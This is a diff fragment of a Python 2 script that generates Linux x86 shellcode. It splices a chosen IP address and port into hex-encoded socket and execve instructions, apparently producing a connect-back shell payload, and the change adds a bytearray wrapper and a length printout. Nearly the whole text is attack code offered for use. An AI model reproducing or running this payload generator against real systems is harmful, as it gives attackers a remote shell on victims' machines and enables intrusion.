@@ -72,7 +72,7 @@ else:
         print "Shellcode-ready address:\t" + addr 
         print "Shellcode-ready port:\t\t" + shellport 
  
-        shellcode = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2"
+        shellcode = bytearray("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2"
             "\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a"
             "\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x31"
             "\\xdb\\xb3\\x02\\x68" +addr+ "\\x66\\x68" +shellport+  
@@ -84,6 +84,7 @@ else:
             "\\xb0\\x0b\\xcd\\x80")
  
         print "Final shellcode:\t\n" + shellcode + "\""
+        print "Shellocde length is:\t\t" + str(len(shellcode)/4) + "\n"
  
     except:
         print "exiting..."
